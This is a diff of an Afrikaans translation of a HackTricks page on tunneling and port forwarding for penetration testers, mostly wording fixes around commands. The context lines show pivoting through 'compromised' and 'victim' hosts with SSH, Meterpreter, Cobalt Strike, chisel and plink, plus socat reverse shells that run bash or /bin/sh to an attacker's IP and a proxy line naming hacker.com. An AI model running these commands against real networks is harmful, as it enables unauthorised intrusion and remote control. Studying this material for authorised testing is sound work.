@@ -2,10 +2,10 @@
 
 <details>
 
-<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 * Werk jy by 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die [hacktricks-opslagplek](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud-opslagplek](https://github.com/carlospolop/hacktricks-cloud)**.
@@ -14,7 +14,7 @@
 
 **Probeer Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -70,7 +70,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Poort2gasheer (proxychains)
 
-Plaaslike Poort --> Gehackte gasheer (SSH) --> Waarookal
+Plaaslike Poort --> Gehackte gasheer (SSH) --> Waar ook al
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -97,7 +97,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Aktiveer deurstuur op die Bedienerkant
+**Aktiveer deurstuur op die Bedienerkant**
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -130,7 +130,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-### SOCKS
+SOCKS (Socket Secure) is a protocol that routes network packets between a client and a server through a proxy server. It can be used for tunneling and port forwarding to bypass firewalls and access restricted networks.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -142,11 +142,11 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 #### Tunneling
 
-Tunneling involves encapsulating one network protocol within another network protocol. This allows data to be transmitted securely across networks that may not be secure on their own. Tunneling can be used to bypass firewalls and access restricted networks.
+Tunneling is a method that allows data to be transferred securely over an insecure network. It involves encapsulating the data in another protocol to create a secure communication channel. This can be useful for bypassing firewalls, accessing restricted content, and maintaining privacy.
 
 #### Port Forwarding
 
-Port forwarding involves redirecting network traffic from one network port to another. This can be useful for accessing services on a remote network or for exposing a service running on a local machine to the internet. Port forwarding can also be used to bypass network restrictions and access specific services.
+Port forwarding is a technique that allows a computer's port to be accessed from another computer over a network. It can be used to redirect traffic from a specific port to another destination, enabling remote access to services running on a specific port. Port forwarding is commonly used in scenarios where direct communication between two computers is not possible due to network configurations.
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -183,7 +183,7 @@ rportfwd stop [bind port]
 ### rPort2Port plaaslik
 
 {% hint style="warning" %}
-In hierdie geval word die **poort oopgemaak in die bakenserver**, nie in die Spanbediener nie en die **verkeer word gestuur na die Cobalt Strike-klient** (nie na die Spanbediener nie) en vandaar na die aangeduide gasheer:poort
+In hierdie geval word die **poort oopgemaak in die bakenserver**, nie in die Spanbediener nie en die **verkeer word gestuur na die Cobalt Strike-kliënt** (nie na die Spanbediener nie) en vandaar na die aangeduide gasheer:poort
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -201,8 +201,6 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 
 Jy kan dit aflaai van die vrystellingsbladsy van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
 Jy moet dieselfde weergawe vir klient en bediener gebruik
-
-### sokkies
 ```bash
 ./chisel server -p 8080 --reverse #Server -- Attacker
 ./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
@@ -255,7 +253,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### Poort-tot-poort deur sokkies
+### Poort-tot-poort deur middel van kouse
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
@@ -273,7 +271,7 @@ Jy kan 'n **nie-geauthentiseerde proksi** omseil deur hierdie lyn uit te voer in
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
-[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+[https://funoverip.net/2011/01/omgekeerde-ssl-agterdeur-met-socat-en-metasploit/](https://funoverip.net/2011/01/omgekeerde-ssl-agterdeur-met-socat-en-metasploit/)
 
 ### SSL Socat Tonnel
 
@@ -293,7 +291,7 @@ chmod 600 $FILENAME.key $FILENAME.pem
 attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
-### Verre Poort-tot-Poort
+### Afgeleë Poort-tot-Poort
 
 Verbind die plaaslike SSH-poort (22) met die 443-poort van die aanvaller se gasheer.
 ```bash
@@ -305,7 +303,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Dit is soos 'n konsolweergawe van PuTTY (die opsies is baie soortgelyk aan 'n ssh-klient).
 
-Aangesien hierdie binêre lêer op die slagoffer uitgevoer sal word en dit 'n ssh-klient is, moet ons ons ssh-diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs plaaslik toeganklike poorte na 'n poort op ons masjien deur te stuur:
+Aangesien hierdie binêre lêer op die slagoffer uitgevoer sal word en dit 'n ssh-klient is, moet ons ons ssh-diens en poort oopmaak sodat ons 'n omgekeerde verbinding kan hê. Dan, om slegs lokaal toeganklike poorte na 'n poort op ons masjien deur te stuur:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -337,13 +335,13 @@ Laai **`SocksOverRDP-Plugin.dll`** op jou kliëntrekenaar soos hierdie:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Nou kan ons **verbind** met die **slagoffer** oor **RDP** deur **`mstsc.exe`** te gebruik, en ons behoort 'n **aanvraag** te ontvang wat sê dat die **SocksOverRDP-inprop geaktiveer** is, en dit sal **luister** op **127.0.0.1:1080**.
+Nou kan ons **verbind** met die **slagoffer** oor **RDP** deur **`mstsc.exe`** te gebruik, en ons behoort 'n **aanvraag** te ontvang wat sê dat die **SocksOverRDP-inprop** geaktiveer is, en dit sal **luister** op **127.0.0.1:1080**.
 
-**Verbind** via **RDP** en laai & voer die `SocksOverRDP-Server.exe` binêre lêer op die slagoffer se masjien uit:
+**Verbind** via **RDP** en laai & voer op die slagoffer se masjien die `SocksOverRDP-Server.exe` binêre lêer uit:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-### Bevestig nou op jou masjien (aanvaller) dat poort 1080 aan die luister is:
+Bevestig nou op jou masjien (aanvaller) dat poort 1080 aan die luister is:
 ```
 netstat -antb | findstr 1080
 ```
@@ -355,7 +353,7 @@ Jy kan Windows GUI-programme laat navigeer deur 'n proxy te gebruik met [**Proxi
 In **Profiel -> Proxy-bedieners** voeg die IP en poort van die SOCKS-bediener by.\
 In **Profiel -> Proxifiseringreëls** voeg die naam van die program wat geproxifiseer moet word by en die verbindinge na die IP-adresse wat jy wil proxifiseer.
 
-## NTLM proxy omleiding
+## NTLM proxy omseil
 
 Die voorheen genoemde instrument: **Rpivot**\
 **OpenVPN** kan dit ook omseil deur hierdie opsies in die konfigurasie-lêer in te stel:
@@ -425,7 +423,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Verander proxychains DNS
 
-Proxychains onderskep die `gethostbyname` libc-oproep en stuur tcp DNS-versoeke deur die socks-proksi. Standaard gebruik proxychains die DNS-bediener **4.2.2.2** (hardgekoppel). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows-omgewing** is, kan jy die IP van die **domeinbeheerder** instel.
+Proxychains onderskep die `gethostbyname` libc-oproep en stuur tcp DNS-versoeke deur die socks-proksi. Standaard gebruik proxychains die DNS-bediener **4.2.2.2** (hardgekoeër). Om dit te verander, wysig die lêer: _/usr/lib/proxychains3/proxyresolv_ en verander die IP. As jy in 'n **Windows-omgewing** is, kan jy die IP van die **domeinbeheerder** instel.
 
 ## Tonnels in Go
 
@@ -462,8 +460,8 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) is 'n gereedskap om oplossings aan die internet bloot te stel in een opdragreël.**
-*Exposisie URI's is soos:* **UID.ngrok.io**
+**[ngrok](https://ngrok.com/) is 'n gereedskap om oplossings aan die internet bloot te stel met een opdragreël.**
+*Blootstellings URI is soos:* **UID.ngrok.io**
 
 ### Installasie
 
@@ -506,7 +504,7 @@ Direk vanaf stdout of in die HTTP-koppelvlak [http://127.0.0.1:4040](http://127.
 # With basic auth
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
-#### ngrok.yaml eenvoudige konfigurasievoorbeeld
+#### ngrok.yaml eenvoudige konfigurasie voorbeeld
 
 Dit maak 3 tonnels oop:
 - 2 TCP
@@ -530,7 +528,7 @@ addr: file:///tmp/httpbin/
 
 **Probeer Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -540,8 +538,8 @@ addr: file:///tmp/httpbin/
 
 <summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Werk jy in 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die [hacktricks repo](https://github.com/carlospolop/hacktricks) en [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
